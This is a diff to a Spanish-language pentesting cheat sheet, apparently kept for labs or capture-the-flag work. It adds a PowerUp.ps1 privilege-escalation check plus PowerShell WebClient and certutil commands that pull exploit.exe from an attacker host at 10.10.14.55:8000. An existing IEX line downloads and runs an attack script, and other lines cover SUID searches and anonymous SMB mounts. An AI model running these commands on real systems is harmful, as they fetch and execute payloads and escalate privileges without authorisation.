@@ -53,6 +53,7 @@ find \-perm -4000 2>/dev/null  ##listar archivos con permisos suid
 find \-user user_priv 2>/dev/null --> recursos donde ese usuario sea propietario
 
 ##RECON PRIVESC##
+PowerUp.ps1 --> all-checks para windows
 uname -a --> ver version de kernel
 id ## ver grupos
 sudo -l ## ver comandos que se pueden ejecutar como root sin pass
@@ -66,8 +67,10 @@ smbclient //X.X.X.X/tmp -N --> parametro -N conecta como anonymous
 mount -t cifs //X.X.X.X/remotefolder /mnt/mountfolder -o username=null, password=null,domain=WORKGROUP,rw. --> montar carpeta localmente
 
 
-##Powershell download HTTP##
+##Download HTTP##
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.55:8000/exploit.exe', 'C:\users\ususario\Desktop\exploit.exe')"
 powershell "IEX(New-Object Net.Webclient).downloadString('http://xx.xx.xx.x:xxx/powershell_attack.ps1')"
+certutil.exe -f -urlcache -split http://X.X.X.X:8000/exploit.exe exploit.exe
 
 ##Transfer files##
 Python -m SimpleHTTPServer
